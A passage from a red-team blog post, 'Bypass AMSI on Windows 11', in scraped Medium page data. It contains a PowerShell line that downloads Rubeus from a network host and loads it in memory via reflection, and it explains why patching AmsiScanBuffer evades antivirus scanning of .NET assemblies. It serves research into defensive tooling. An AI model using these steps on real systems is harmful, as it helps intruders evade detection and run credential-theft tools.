work.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_107":{"__typename":"Paragraph","id":"4780fc344bbe_107","name":"3095","type":"P","href":null,"layout":null,"metadata":null,"text":"We can use reflection to download a C# tool in memory and execute it.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_108":{"__typename":"Paragraph","id":"4780fc344bbe_108","name":"9dd9","type":"PRE","href":null,"layout":null,"metadata":null,"text":"$data=(new-object System.Net.WebClient).DownloadData(‘http:\u002F\u002F192.168.0.45:443\u002Frubeus.exe’)\n$assembly=[System.Reflection.Assembly]::Load($data)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"shell"},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_109":{"__typename":"Paragraph","id":"4780fc344bbe_109","name":"559d","type":"P","href":null,"layout":null,"metadata":null,"text":"As the following 2 screenshots show, we already bypassed AMSI by attacking AmsiOpenSession and AmsiInitialize, but we cannot load Rubeus in memory.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*M8TDEw62U-6a8wtv.png":{"__typename":"ImageMetadata","id":"0*M8TDEw62U-6a8wtv.png","originalHeight":593,"originalWidth":1456,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_110":{"__typename":"Paragraph","id":"4780fc344bbe_110","name":"5e1e","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*M8TDEw62U-6a8wtv.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*VxGHeTWYsvO7BJwu.png":{"__typename":"ImageMetadata","id":"0*VxGHeTWYsvO7BJwu.png","originalHeight":552,"originalWidth":1460,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_111":{"__typename":"Paragraph","id":"4780fc344bbe_111","name":"f952","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*VxGHeTWYsvO7BJwu.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_112":{"__typename":"Paragraph","id":"4780fc344bbe_112","name":"0c98","type":"P","href":null,"layout":null,"metadata":null,"text":"However, if we patch AmsiScanBuffer, we will be fine and successfully load Rubeus in memory.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*pkKNhvWefQWsFYc-.png":{"__typename":"ImageMetadata","id":"0*pkKNhvWefQWsFYc-.png","originalHeight":125,"originalWidth":1424,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_113":{"__typename":"Paragraph","id":"4780fc344bbe_113","name":"31d3","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*pkKNhvWefQWsFYc-.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_114":{"__typename":"Paragraph","id":"4780fc344bbe_114","name":"8bc8","type":"P","href":null,"layout":null,"metadata":null,"text":"Why? Because when Assembly.Load() method is used, function AmsiScan in clr.dll will be called additionally.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":18,"end":34,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":59,"end":68,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":71,"end":79,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_115":{"__typename":"Paragraph","id":"4780fc344bbe_115","name":"0f56","type":"P","href":null,"layout":null,"metadata":null,"text":"Set 4 breakpoints for powershell.exe process","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_116":{"__typename":"Paragraph","id":"4780fc344bbe_116","name":"03f8","type":"P","href":null,"layout":null,"metadata":null,"text":"amsi!AmsiInitialize\namsi!AmsiOpenSession\namsi!AmsiScanBuffer\nclr!AmsiScan","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":73,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_117":{"__typename":"Paragraph","id":"4780fc344bbe_117","name":"3e80","type":"P","href":null,"layout":null,"metadata":null,"text":"After supplying malicious content “invoke-mimikatz”, breakpoints at AmsiOpenSession and AmsiScanbuffer are reached, but functions AmsiInitialize and AmsiScan are not called。","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":130,"end":144,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":149,"end":158,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*5CJcYh4a8BelZZUQ.png":{"__typename":"ImageMetadata","id":"0*5CJcYh4a8BelZZUQ.png","originalHeight":166,"originalWidth":756,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_118":{"__typename":"Paragraph","id":"4780fc344bbe_118","name":"4a51","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*5CJcYh4a8BelZZUQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_119":{"__typename":"Paragraph","id":"4780fc344bbe_119","name":"f488","type":"P","href":null,"layout":null,"metadata":null,"text":"If executing [System.Reflection.Assembly]::Load() command, we find that the first 2 breakpoints are still reached, and this time, we have three more hits. The 3 more hits prove that .NET assembly in memory is scanned additionally.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":12,"end":49,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*2RrZPAJ8kL6Debp1.png":{"__typename":"ImageMetadata","id":"0*2RrZPAJ8kL6Debp1.png","originalHeight":419,"originalWidth":1241,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_120":{"__typename":"Paragraph","id":"4780fc344bbe_120","name":"cc20","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*2RrZPAJ8kL6Debp1.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_121":{"__typename":"Paragraph","id":"4780fc344bbe_121","name":"c898","type":"P","href":null,"layout":null,"metadata":null,"text":"Inspect function AmsiScan in clr.dll, we find that AmsiInitialize and AmsiScan are called, while AmsiOpenSession is not called.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":17,"end":25,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":29,"end":36,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*iveKJM_o_a7G8XM_.png":{"__typename":"ImageMetadata","id":"0*iveKJM_o_a7G8XM_.png","originalHeight":813,"originalWidth":1545,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_122":{"__typename":"Paragraph","id":"4780fc344bbe_122","name":"83f7","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*iveKJM_o_a7G8XM_.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*9G2DugkC6y3P46Wm.png":{"__typename":"ImageMetadata","id":"0*9G2DugkC6y3P46Wm.png","originalHeight":441,"originalWidth":1189,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_123":{"__typename":"Paragraph","id":"4780fc344bbe_123","name":"6625","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*9G2DugkC6y3P46Wm.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_124":{"__typename":"Paragraph","id":"4780fc344bbe_124","name":"d7a5","type":"P","href":null,"layout":null,"metadata":null,"text":"In summary, the one-liner payload that attacks AmsiInitialize does not work because the payload changes sub-values of the System.Management.Automation namespace. This namespace is the root namespace for PowerShell; it is not related to .NET assembly scanning. AmsiOpenSession is not called in AmsiScan at all. AmsiScanBuffer is called, therefore, the bypass technique by attacking AmsiScanBuffer still works when loading a .NET assembly.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":122,"end":150,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_125":{"__typename":"Paragraph","id":"4780fc344bbe_125","name":"6007","type":"H3","href":null,"layout":null,"metadata":null,"text":"Reference","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_126":{"__typename":"Paragraph","id":"4780fc344bbe_126","name":"6715","type":"P","href":null,"layout":null,"metadata":null,"text":"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Famsi\u002Fimages\u002Famsi7archi.jpg\nhttps:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fapi\u002Famsi\u002Fnf-amsi-amsiinitialize\nhttps:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fapi\u002Famsi\u002Fnf-amsi-amsiopensession\nhttps:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fapi\u002Famsi\u002Fnf-amsi-amsiscanbuffer\nhttps:\u002F\u002Fgithub.com\u002FPowerShellMafia\u002FPowerSploit\u002Fblob\u002Fmaster\u002FPrivesc\u002FPowerUp.ps1\nhttps:\u002F\u002Fgithub.com\u002Frasta-mouse\u002FAmsiScanBufferBypass\nhttps:\u002F\u002Fbook.hacktricks.xyz\u002Fwindows-hardening\u002Fwindows-av-bypass\nhttps:\u002F\u002Fgithub.com\u002FTheD1rkMtr\u002FAMSI_patch\nhttps:\u002F\u002Fpentestlaboratories.com\u002F2021\u002F05\u002F17\u002Famsi-bypass-methods\u002F\nhttps:\u002F\u002Frastamouse.me\u002Fmemory-patching-amsi-bypass\u002F\nhttps:\u002F\u002Fs3cur3th1ssh1t.github.io\u002FPowershell-and-the-.NET-AMSI-Interface\u002F\nhttps:\u002F\u002Fcyberwarfare.live\u002Fassembly-load-writing-one-byte-to-evade-amsi-scan\u002F","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":73,"href":"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Famsi\u002Fimages\u002Famsi7archi.jpg","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":74,"end":153,"href":"https:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fapi\u002Famsi\u002Fnf-amsi-amsiinitialize","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":154,"end":234,"href":"https:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fapi\u002Famsi\u002Fnf-amsi-amsiopensession","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":235,"end":314,"href":"https:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fapi\u002Famsi\u002Fnf-amsi-amsiscanbuffer","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":315,"end":393,"href":"https:\u002F\u002Fgithub.com\u002FPowerShellMafia\u002FPowerSploit\u002Fblob\u002Fmaster\u002FPrivesc\u002FPowerUp.ps1","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":394,"end":445,"href":"https:\u002F\u002Fgithub.com\u002Frasta-mouse\u002FAmsiScanBufferBypass","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":446,"end":509,"href":"https:\u002F\u002Fbook.hacktricks.xyz\u002Fwindows-hardening\u002Fwindows-av-bypass","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":510,"end":550,"href":"https:\u002F\u002Fgithub.com\u002FTheD1rkMtr\u002FAMSI_patch","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":551,"end":614,"href":"https:\u002F\u002Fpentestlaboratories.com\u002F2021\u002F05\u002F17\u002Famsi-bypass-methods\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":615,"end":665,"href":"https:\u002F\u002Frastamouse.me\u002Fmemory-patching-amsi-bypass\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":666,"end":738,"href":"https:\u002F\u002Fs3cur3th1ssh1t.github.io\u002FPowershell-and-the-.NET-AMSI-Interface\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":739,"end":815,"href":"https:\u002F\u002Fcyberwarfare.live\u002Fassembly-load-writing-one-byte-to-evade-amsi-scan\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Tag:red-team":{"__typename":"Tag","id":"red-team","displayTitle":"Red Team","normalizedTagSlug":"red-team"},"Tag:offsec":{"__typename":"Tag","id":"offsec","displayTitle":"Offsec","normalizedTagSlug":"offsec"},"Tag:offensive-security":{"__typename":"Tag","id":"offensive-security","displayTitle":"Offensive Security","normalizedTagSlug":"offensive-security"},"Tag:cybersecurity":{"__typename":"Tag","id":"cybersecurity","displayTitle":"Cybersecurity","normalizedTagSlug":"cybersecurity"},"Post:75d231b2cac6":{"__typename":"Post","id":"75d231b2cac6","collection":null,"content({\"postMeteringOptions\":{}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"1872","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:4780fc344bbe_0"},{"__ref":"Paragraph:4780fc344bbe_1"},{"__ref":"Paragraph:4780fc344bbe_2"},{"__ref":"Paragraph:4780fc344bbe_3"},{"__ref":"Paragraph:4780fc344bbe_4"},{"__ref":"Paragraph:4780fc344bbe_5"},{"__ref":"Paragraph:4780fc344bbe_6"},{"__ref":"Paragraph:4780fc344bbe_7"},{"__ref":"Paragraph:4780fc344bbe_8"},{"__ref":"Paragraph:4780fc344bbe_9"},{"__ref":"Paragraph:4780fc344bbe_10"},{"__ref":"Paragraph:4780fc344bbe_11"},{"__ref":"Paragraph:4780fc344bbe_12"},{"__ref":"Paragraph:4780fc344bbe_13"},{"__ref":"Paragraph:4780fc344bbe_14"},{"__ref":"Paragraph:4780fc344bbe_15"},{"__ref":"Paragraph:4780fc344bbe_16"},{"__ref":"Paragraph:4780fc344bbe_17"},{"__ref":"Paragraph:4780fc344bbe_18"},{"__ref":"Paragraph:4780fc344bbe_19"},{"__ref":"Paragraph:4780fc344bbe_20"},{"__ref":"Paragraph:4780fc344bbe_21"},{"__ref":"Paragraph:4780fc344bbe_22"},{"__ref":"Paragraph:4780fc344bbe_23"},{"__ref":"Paragraph:4780fc344bbe_24"},{"__ref":"Paragraph:4780fc344bbe_25"},{"__ref":"Paragraph:4780fc344bbe_26"},{"__ref":"Paragraph:4780fc344bbe_27"},{"__ref":"Paragraph:4780fc344bbe_28"},{"__ref":"Paragraph:4780fc344bbe_29"},{"__ref":"Paragraph:4780fc344bbe_30"},{"__ref":"Paragraph:4780fc344bbe_31"},{"__ref":"Paragraph:4780fc344bbe_32"},{"__ref":"Paragraph:4780fc344bbe_33"},{"__ref":"Paragraph:4780fc344bbe_34"},{"__ref":"Paragraph:4780fc344bbe_35"},{"__ref":"Paragraph:4780fc344bbe_36"},{"__ref":"Paragraph:4780fc344bbe_37"},{"__ref":"Paragraph:4780fc344bbe_38"},{"__ref":"Paragraph:4780fc344bbe_39"},{"__ref":"Paragraph:4780fc344bbe_40"},{"__ref":"Paragraph:4780fc344bbe_41"},{"__ref":"Paragraph:4780fc344bbe_42"},{"__ref":"Paragraph:4780fc344bbe_43"},{"__ref":"Paragraph:4780fc344bbe_44"},{"__ref":"Paragraph:4780fc344bbe_45"},{"__ref":"Paragraph:4780fc344bbe_46"},{"__ref":"Paragraph:4780fc344bbe_47"},{"__ref":"Paragraph:4780fc344bbe_48"},{"__ref":"Paragraph:4780fc344bbe_49"},{"__ref":"Paragraph:4780fc344bbe_50"},{"__ref":"Paragraph:4780fc344bbe_51"},{"__ref":"Paragraph:4780fc344bbe_52"},{"__ref":"Paragraph:4780fc344bbe_53"},{"__ref":"Paragraph:4780fc344bbe_54"},{"__ref":"Paragraph:4780fc344bbe_55"},{"__ref":"Paragraph:4780fc344bbe_56"},{"__ref":"Paragraph:4780fc344bbe_57"},{"__ref":"Paragraph:4780fc344bbe_58"},{"__ref":"Paragraph:4780fc344bbe_59"},{"__ref":"Paragraph:4780fc344bbe_60"},{"__ref":"Paragraph:4780fc344bbe_61"},{"__ref":"Paragraph:4780fc344bbe_62"},{"__ref":"Paragraph:4780fc344bbe_63"},{"__ref":"Paragraph:4780fc344bbe_64"},{"__ref":"Paragraph:4780fc344bbe_65"},{"__ref":"Paragraph:4780fc344bbe_66"},{"__ref":"Paragraph:4780fc344bbe_67"},{"__ref":"Paragraph:4780fc344bbe_68"},{"__ref":"Paragraph:4780fc344bbe_69"},{"__ref":"Paragraph:4780fc344bbe_70"},{"__ref":"Paragraph:4780fc344bbe_71"},{"__ref":"Paragraph:4780fc344bbe_72"},{"__ref":"Paragraph:4780fc344bbe_73"},{"__ref":"Paragraph:4780fc344bbe_74"},{"__ref":"Paragraph:4780fc344bbe_75"},{"__ref":"Paragraph:4780fc344bbe_76"},{"__ref":"Paragraph:4780fc344bbe_77"},{"__ref":"Paragraph:4780fc344bbe_78"},{"__ref":"Paragraph:4780fc344bbe_79"},{"__ref":"Paragraph:4780fc344bbe_80"},{"__ref":"Paragraph:4780fc344bbe_81"},{"__ref":"Paragraph:4780fc344bbe_82"},{"__ref":"Paragraph:4780fc344bbe_83"},{"__ref":"Paragraph:4780fc344bbe_84"},{"__ref":"Paragraph:4780fc344bbe_85"},{"__ref":"Paragraph:4780fc344bbe_86"},{"__ref":"Paragraph:4780fc344bbe_87"},{"__ref":"Paragraph:4780fc344bbe_88"},{"__ref":"Paragraph:4780fc344bbe_89"},{"__ref":"Paragraph:4780fc344bbe_90"},{"__ref":"Paragraph:4780fc344bbe_91"},{"__ref":"Paragraph:4780fc344bbe_92"},{"__ref":"Paragraph:4780fc344bbe_93"},{"__ref":"Paragraph:4780fc344bbe_94"},{"__ref":"Paragraph:4780fc344bbe_95"},{"__ref":"Paragraph:4780fc344bbe_96"},{"__ref":"Paragraph:4780fc344bbe_97"},{"__ref":"Paragraph:4780fc344bbe_98"},{"__ref":"Paragraph:4780fc344bbe_99"},{"__ref":"Paragraph:4780fc344bbe_100"},{"__ref":"Paragraph:4780fc344bbe_101"},{"__ref":"Paragraph:4780fc344bbe_102"},{"__ref":"Paragraph:4780fc344bbe_103"},{"__ref":"Paragraph:4780fc344bbe_104"},{"__ref":"Paragraph:4780fc344bbe_105"},{"__ref":"Paragraph:4780fc344bbe_106"},{"__ref":"Paragraph:4780fc344bbe_107"},{"__ref":"Paragraph:4780fc344bbe_108"},{"__ref":"Paragraph:4780fc344bbe_109"},{"__ref":"Paragraph:4780fc344bbe_110"},{"__ref":"Paragraph:4780fc344bbe_111"},{"__ref":"Paragraph:4780fc344bbe_112"},{"__ref":"Paragraph:4780fc344bbe_113"},{"__ref":"Paragraph:4780fc344bbe_114"},{"__ref":"Paragraph:4780fc344bbe_115"},{"__ref":"Paragraph:4780fc344bbe_116"},{"__ref":"Paragraph:4780fc344bbe_117"},{"__ref":"Paragraph:4780fc344bbe_118"},{"__ref":"Paragraph:4780fc344bbe_119"},{"__ref":"Paragraph:4780fc344bbe_120"},{"__ref":"Paragraph:4780fc344bbe_121"},{"__ref":"Paragraph:4780fc344bbe_122"},{"__ref":"Paragraph:4780fc344bbe_123"},{"__ref":"Paragraph:4780fc344bbe_124"},{"__ref":"Paragraph:4780fc344bbe_125"},{"__ref":"Paragraph:4780fc344bbe_126"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:39cded15042e"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fgustavshen.medium.com\u002Fbypass-amsi-on-windows-11-75d231b2cac6","primaryTopic":null,"topics":[{"__typename":"Topic","slug":"javascript"},{"__typename":"Topic","slug":"programming"}],"isPublished":true,"latestPublishedVersion":"4780fc344bbe","visibility":"PUBLIC","postResponses":{"__typename":"PostResponses","count":0},"createdAt":1690423693471,"firstPublishedAt":1690424214268,"latestPublishedAt":1690424214268,"clapCount":114,"allowResponses":true,"isLimitedState":false,"title":"Bypass AMSI on Windows 11","isSeries":false,"sequence":null,"uniqueSlug":"bypass-amsi-on-windows-11-75d231b2cac6","socialTitle":"","socialDek":"","noIndex":null,"canonicalUrl":"","metaDescription":"","readingTime":9.99056603773585,"previewContent":{"__typename":"PreviewContent","subtitle":"Motivation"},"previewImage":{"__ref":"ImageMetadata:0*5P_PNHqYmPYGuhMk.png"},"isShortform":false,"seoTitle":"","updatedAt":1690587305640,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:red-team"},{"__ref":"Tag:offsec"},{"__ref":"Tag:offensive-security"},{"__ref":"Tag:cybersecurity"}],"isNewsletter":false,"statusForCollection":null,"pendingCollection":null,"detectedLanguage":"en","wordCount":1985,"layerCake":6}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"HIT"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.0ff8530a.js"></script><script src="https://cdn-client.medium.com/lite/static/js/2640.3217006c.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.7db0aaff.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.4ddbf12e.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.2021fe63.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4398.db4d4378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7883.0e445e04.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9281.e9be8bce.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7111.b294e9da.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6481.362dec70.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8695.6f58679b.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8978.4b110123.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3418.eb013b5a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3894.e3d01e2c.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5514.32e692f6.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5203.e7f058c5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7098.93054372.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8051.0a9d3f4b.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8558.abbaadfd.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1711.7605eb3e.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8597.762eae49.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9174.b1b0f607.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8883.2f95bbf4.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/705.e5898c57.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2911.d072adec.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8580.feeb2549.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6046.f9be485b.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/500.d5389c14.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9408.22b56993.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6605.84e81b15.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6637.661bd7cf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7421.3f94f5ea.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/51.d8fb2684.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2133.c8ba56b1.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.81dff084.chunk.js"></script><script>window.main();</script><script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;rayId&quot;:&quot;8942782e3d32b379&quot;,&quot;version&quot;:&quot;2024.4.1&quot;,&quot;token&quot;:&quot;0b5f665943484354a59c39c6833f7078&quot;}" crossorigin="anonymous"></script>
<div><div class="tq n xf xg st xh xi xj xk xl xm xn xo xp xq ce bm xr xs xt lc xu xv"><div class="bc b ds z wa"><div class="ab cm xw xx"><div class="l" role="alert">To make Medium work, we log user data. By using Medium, you agree to our <a class="af ag ah ai aj ak al am an ao ap xy xz qo" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9" rel="noopener follow" target="_blank">Privacy Policy</a>, including cookie policy.</div><div class="ya yb yc yd ye yf l yg iu yh"><div class="l fg n uh"><button class="af ag ah ai aj ak al am an ao ap xy xz yi yj ab" data-testid="close-button" aria-label="close"><svg width="19" height="19" viewBox="0 0 19 19" class="em el"><path d="M13.8 4.6L9.5 8.89 5.21 4.6l-.61.61 4.29 4.3-4.29 4.28.61.62 4.3-4.3 4.28 4.3.62-.62-4.3-4.29 4.3-4.29" fill-rule="evenodd"></path></svg></button></div></div></div></div></div></div></body></html>